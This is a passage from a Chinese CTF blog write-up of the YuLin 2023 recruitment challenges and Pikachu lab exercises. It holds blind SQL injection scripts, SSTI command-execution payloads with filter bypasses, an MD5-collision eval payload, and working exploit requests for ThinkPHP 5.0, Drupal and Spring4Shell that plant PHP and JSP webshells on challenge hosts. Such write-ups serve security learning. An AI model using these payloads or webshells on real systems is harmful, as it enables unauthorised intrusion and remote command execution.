<h1 id="获取字符"><a href="#获取字符" class="headerlink" title="获取字符"></a>获取字符</h1><p>def getStr(url, payload, length):<br>    str &#x3D; ‘’  # 初始表名&#x2F;库名为空</p>
<p>    # 第一层循环，截取每一个字符</p>
<p>    for l in range(1, length+1):</p>
<p>        # 第二层循环，枚举截取字符的每一种可能性</p>
<p>        for n in range(33, 126):<br>            response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n))</p>
<p>            # 页面中出现此内容则表示成功</p>
<p>            if ‘OK’ in response.text:<br>                str+&#x3D; chr(n)<br>                print(‘第’, l, ‘个字符猜解成功：’, str)<br>                break;<br>    return str;</p>
<h1 id="开始猜解"><a href="#开始猜解" class="headerlink" title="开始猜解"></a>开始猜解</h1><p>length &#x3D; getLength(url, payload_len)<br>getStr(url, payload_str, length)</p>
<p>每次要改的地方只有标红的区域</p>
<ol>
<li></li>
</ol>
<p>database()</p>
<p>爆出来表名为security</p>
<ol start="2">
<li></li>
</ol>
<p>这里先手动对当前数据库爆表的数量，很方便</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and (select COUNT(*) from information_schema.tables where<br>table_schema&#x3D;database())&#x3D;5</p>
<p>爆出来是5</p>
<ol start="3">
<li></li>
</ol>
<p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit<br>0,1</p>
<p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit<br>0,1</p>
<p>第一个表</p>
<p>referers</p>
<p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit 1,1</p>
<p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit 1,1</p>
<p>只改limit后面的数就完事</p>
<p>第二个表</p>
<p>emails</p>
<p>以此推类</p>
<p>第三个表users</p>
<p>第四个表flag</p>
<p>第五个表 就不查了</p>
<p>4.手动爆一些users的列数量</p>
<p><a target="_blank" rel="noopener" href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and (select COUNT(*) from information_schema.columns where<br>table_schema&#x3D;database() and table_name&#x3D;”users”)&#x3D;3</p>
<p>爆出来是3</p>
<p>注意这里要用双引号，我也不知道为啥。。</p>
<ol start="5">
<li></li>
</ol>
<p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name &#x3D;”users” limit 0,1</p>
<p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name&#x3D;”users” limit 0,1</p>
<p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name&#x3D;”users” limit 0,1</p>
<p>测出uers第一列:id</p>
<p>测出uers第三列:</p>
<p>测出uers第三列:password</p>
<p>不测了，才发现前面搞错了 flag已经整出来了</p>
<p>那就重复这些步骤找flag的列</p>
<p>测出flag第二列flag</p>
<ol start="6">
<li></li>
</ol>
<p>select<br>flag from flag limit 0,1</p>
<p>终于爆出来了</p>
<p>可能是我脚本的问题，速度是龟速，靠脚本还是花了好久时间，不过只是为了解出题那瞬间的多巴胺分泌带来的快感，也是值得的</p>
<p>找朋友要了个更快的自动化脚本</p>
<ol start="4">
<li></li>
</ol>
<p>还是整形闭合</p>
<p>在朋友脚本的基础上改了一下做出来了</p>
<p>不过精确度不高</p>
<p>延时盲注的一些语句：</p>
<p>“1<br>and if((select count(table_name) from<br>information_schema.tables where table_schema &#x3D; ‘database()’) &#x3D; 1,sleep(2),1)</p>
<p>主要是运用if三元式和sleep的原理</p>
<p>YulinSec{0kfjtXaE8VJxXFG9BjZSy0Yn6dVLLMwbQ3OiaI20}</p>
<ol start="5">
<li></li>
</ol>
<p>还不会</p>
<p>Babyurl</p>
<p>考察ssrf</p>
<p>urls&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a></p>
<p><code>SSTI</code></p>
<p><code>1.</code></p>
<p><code>1.&#123;&#123;''.__class__&#125;&#125;   # 获得单引号的类型</code></p>
<p><code>2.&#123;&#123;''.__class__.__base__&#125;&#125; #获得object</code></p>
<p><code>3.&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;#获得基类</code></p>
<p><code>这里要写个脚本得到os._wrap_close的键值</code></p>
<p><code>4.&#123;&#123;''.__class__.__base__.__subclasses__()[127]&#125;&#125;#这里我们利用的是&lt;class</code><br><code>&#39;os._wrap_close&#39;&gt;类</code></p>
<p><code>5.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__&#125;&#125;#将该类实例化并且全局搜索查找所有的方法、变量和参数</code></p>
<p><code>6.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls').read()&#125;&#125;#利用popen函数执行命令</code></p>
<p><code>7.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('cat
flag').read()&#125;&#125;#最后获得flag</code></p>
<p><code>不是直接cat，但差不多吧</code></p>
<p><code>2.</code></p>
<p><code>过滤&#123;&#123;`

`用&#123;%print(来代替`

`比如`

`&#123;%print(''.__class__)%&#125;`

`然后按第一题思路就行`

`&#123;%print(''.__class__.__base__.__subclasses__()[127]) .__init__.__globals__['popen']('cat
/flag').read()%&#125;`

`3.`

`过滤[]，用getitem`

`&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('ls').read()&#125;&#125;</code></p>
<p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat`
`/flag').read()&#125;&#125;</code></p>
<p><code>4.</code></p>
<p><code>过滤下划线</code></p>
<p><code>用16进制编码绕过</code></p>
<p><code>&#123;&#123;()['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[127]['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['popen']('cat`
`/flag').read() &#125;&#125;</code></p>
<p><code>5.</code></p>
<p><code>过滤单双引号</code></p>
<p><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;   同时get传参?a=popen&amp;b=cat /flag</code></p>
<p><code>6．</code></p>
<p><code>过滤小数点</code></p>
<p><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat`
`/flag')['read']()&#125;&#125;</code></p>
<p><code>7.</code></p>
<p><code>过滤了一堆关键字</code></p>
<p><code>&#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[127]['__in'+'it__']['__glo'+'bals__']['pop'+'en']('c'+'at`
`/fl'+'ag')['re'+'ad']()&#125;&#125;</code></p>
<p><code>#</code> </p>
<h1 id="part2"><a href="#part2" class="headerlink" title="part2:"></a>part2:</h1><h1 id="YuLin-2023-Recruit-Writeup-part-2"><a href="#YuLin-2023-Recruit-Writeup-part-2" class="headerlink" title="YuLin 2023 Recruit Writeup part 2"></a>YuLin 2023 Recruit Writeup part 2</h1><p>word太难用了，于是part2都用md来写</p>
<h2 id="Easy-盒武器"><a href="#Easy-盒武器" class="headerlink" title="[Easy]盒武器"></a>[Easy]盒武器</h2><h3 id="picture1"><a href="#picture1" class="headerlink" title="picture1"></a>picture1</h3><p>识图出来：武汉理工大学南湖校区心至楼</p>
<h3 id="picture2"><a href="#picture2" class="headerlink" title="picture2"></a>picture2</h3><p>在地图附件找武汉长江大桥的公园</p>
<p>试出来：湖北省武汉市汉阳区龟山北路5号龟山风景区</p>
<p>看出题人空间找到10.4到10.5的武汉游玩信息</p>
<p>穷举试出来：2023年10月05日18时</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;flag1: &#x27;</span>.<span class="variable">$flag1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;a is not equal to b&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;lin&#x27;</span>] &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lin&#x27;</span>]))) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>]);</span><br><span class="line">    <span class="comment">//cat /flag2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个flag考察fastcoll，用fastcoll生成两个md5相同的字符串，由于有不可见字符，要url编码之后get传参</p>
<p>注意这里根据题目要求，生成文件要用system(‘cat &#x2F;flag2’);#</p>
<p>#用于截断，eval只执行system(‘cat &#x2F;flag2’);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;G:\php\app\php-7.4.5-Win32-vc15-x64\a_msg1.txt&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;G:\php\app\php-7.4.5-Win32-vc15-x64\a_msg2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))===<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)!=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b:&quot;</span>;    </span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a url 编码的MD5:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a url 编码的MD5:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;复制a url 的MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3%F1%09o%84%A8%E6n%E0%1F%8E%7B%17l%01W%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%18%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99L%05%3F%CA%84%10%B1%B6%D6%C3qr%29%12m%ED%C4%D0%FB&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;复制b url 的MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC%B9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3q%0Ao%84%A8%E6n%E0%1F%8E%7B%17l%01%D7%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%98%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99%CC%04%3F%CA%84%10%B1%B6%D6%C3qr%29%12%ED%ED%C4%D0%FB&quot;</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&quot;echo 1234 ;#efsdghfgj&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$code</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.142.109.233:2003/?Yu=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%8DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0%C9%EAZd%DA%F7%7D%8C%05%ED4%9B%ECXE%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1x8%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Q%F8%F9%C3%B2%EFwp%8AQv%3D%C7aq%BFV%F5%86X&amp;lin=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%0DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0I%EBZd%DA%F7%7D%8C%05%ED4%9B%ECX%C5%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1%F88%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Qx%F9%C3%B2%EFwp%8AQv%3D%C7aq%3FV%F5%86X</span><br></pre></td></tr></table></figure>

<h2 id="EASY-Script-Kiddie"><a href="#EASY-Script-Kiddie" class="headerlink" title="[EASY]Script Kiddie"></a>[EASY]Script Kiddie</h2><p>既然当脚本小子我就只求结果了（</p>
<h3 id="thinkphp-5-0"><a href="#thinkphp-5-0" class="headerlink" title="thinkphp 5.0"></a>thinkphp 5.0</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<h3 id="drupal"><a href="#drupal" class="headerlink" title="drupal"></a>drupal</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.5.35.176:30003</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>173</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">form_id=user_register_form&amp;<span class="symbol">_drupal_ajax</span>=<span class="number">1</span>&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo <span class="string">&quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pIDs/Pg==&quot;</span> |base64 -d |tee test.php</span></span><br></pre></td></tr></table></figure>

<p>配合使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.35.176:30003/test.php?8=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;fuck&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;http://121.5.35.176:30004/&quot;</span></span><br><span class="line">payload2=<span class="string">&#x27;/fuck.jsp?pwd=fuck&amp;cmd=id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    U1=requests.get(url=ip+payload1,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">    U2=requests.get(url=ip+payload2,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> U2.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;The VULN CVE-2022-22965 exists, payload</span></span><br></pre></td></tr></table></figure>

<p>配合</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.35.176:30004/fuck.jsp?pwd=fuck&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>

<h3 id="绝对音感"><a href="#绝对音感" class="headerlink" title="绝对音感"></a>绝对音感</h3><p>wav拖到010editor里，最后一段发现提示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The interval of each byte data is <span class="number">9</span> <span class="keyword">and</span> the first byte is at the beginning of the wav data</span><br></pre></td></tr></table></figure>

<p>c写了个脚本跑出来邮件：</p>
<p>Dear Friend ; Especially for you - this red-hot announcement<br>! We will comply with all removal requests ! This mail<br>is being sent in compliance with Senate bill 2116 ;<br>Title 1 ; Section 303 ! This is NOT unsolicited bulk<br>mail ! Why work for somebody else when you can become<br>rich within 81 months . Have you ever noticed nearly<br>every commercial on television has a .com on in it<br>and nearly every commercial on television has a .com<br>on in it . Well, now is your chance to capitalize on<br>this ! We will help you deliver goods right to the<br>customer’s doorstep and use credit cards on your website<br>! You can begin at absolutely no cost to you . But<br>don’t believe us . Ms Ames who resides in New Jersey<br>tried us and says “Now I’m rich many more things are<br>possible” ! This offer is 100% legal . So make yourself<br>rich now by ordering immediately ! Sign up a friend<br>and you get half off . Thanks ! Dear Salaryman ; Especially<br>for you - this amazing intelligence ! If you are not<br>interested in our publications and wish to be removed<br>from our lists, simply do NOT respond and ignore this<br>mail . This mail is being sent in compliance with Senate<br>bill 2716 , Title 3 , Section 303 ! This is different<br>than anything else you’ve seen . Why work for somebody<br>else when you can become rich within 87 days . Have<br>you ever noticed most everyone has a cellphone and<br>society seems to be moving faster and faster . Well,<br>now is your chance to capitalize on this ! WE will<br>help YOU use credit cards on your website &amp; turn your<br>business into an E-BUSINESS . You can begin at absolutely<br>no cost to you ! But don’t believe us ! Mr Ames of<br>Colorado tried us and says “I’ve been poor and I’ve<br>been rich - rich is better” ! We are licensed to operate<br>in all states . Do not delay - order today ! Sign up<br>a friend and you’ll get a discount of 50% . Thank-you<br>for your serious consideration of our offer .</p>
<p>然后根据提示可以把垃圾邮件给解密</p>
<p>用这个网站</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.spammimic.com/decode.cgi</span><br></pre></td></tr></table></figure>

<h3 id="【Mid】MidBypass"><a href="#【Mid】MidBypass" class="headerlink" title="【Mid】MidBypass"></a>【Mid】MidBypass</h3><p>提示说了有disable_function,给了一个后门</p>
<p>蚁剑一下，第一个flag直接送了，其他路径看不了</p>
<p>还有一个open basedir</p>
<p>phpinfo先看看</p>
<hr>
<p>搜了好多关于imagematrick的文件上传漏洞，但是现在还没搞懂写入的png怎么执行命令🥲</p>
<p>蚁剑插件作弊过了，以后有机会要复现一下</p>
<h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><p>先部署靶场，我直接放在本地127.0.0.1了</p>
<h3 id="解锁皮卡丘的密码"><a href="#解锁皮卡丘的密码" class="headerlink" title="解锁皮卡丘的密码"></a>解锁皮卡丘的密码</h3><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><h4 id="1-基于表单暴力破解"><a href="#1-基于表单暴力破解" class="headerlink" title="1.基于表单暴力破解"></a>1.基于表单暴力破解</h4><p>火狐改下设置抓本地包</p>
<p>burp抓包爆破，爆出来密码123456</p>
<h4 id="2-基于前端的验证码绕过（on-server）"><a href="#2-基于前端的验证码绕过（on-server）" class="headerlink" title="2. 基于前端的验证码绕过（on server）"></a>2. 基于前端的验证码绕过（on server）</h4><p>随便试了下密码怎么还是123456……..</p>
<p>先burp抓包，然后发现一次抓包中验证码不用改</p>
<p>就和1一样了</p>
<h4 id="3-基于前端的验证码绕过（on-client）"><a href="#3-基于前端的验证码绕过（on-client）" class="headerlink" title="3.基于前端的验证码绕过（on client）"></a>3.基于前端的验证码绕过（on client）</h4><p>试了一下验证码是前端的，那么抓包直接去掉，和1一样</p>
<p>密码测出来还是123456</p>
<h4 id="4-token防暴破"><a href="#4-token防暴破" class="headerlink" title="4.token防暴破"></a>4.token防暴破</h4><p>初见还真没思路，搜索了一下</p>
<p>抓包pitchfork爆破密码和token</p>
<p>如图在extract选中token</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f2ca0453.png"></p>
<p>如图填入第一个token,并选择递归搜索</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f2d84a29.png"></p>
<p>成功，密码当然还是12345</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="1-反射型xss-get"><a href="#1-反射型xss-get" class="headerlink" title="1.反射型xss(get)"></a>1.反射型xss(get)</h4><p>试了一堆球星，只认识科比，有点难绷。</p>
<p>试了下限制长度，f12改掉就行，再输入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹窗</p>
<h4 id="2-反射性xss-post"><a href="#2-反射性xss-post" class="headerlink" title="2.反射性xss(post)"></a>2.反射性xss(post)</h4><p>出bug了，我这题出现了登录框</p>
<p>搜索这题本来的样子，然后脑过吧</p>
<p>改成post就是post传参</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-存储型xss"><a href="#3-存储型xss" class="headerlink" title="3.存储型xss"></a>3.存储型xss</h4><p>也是输入</p>
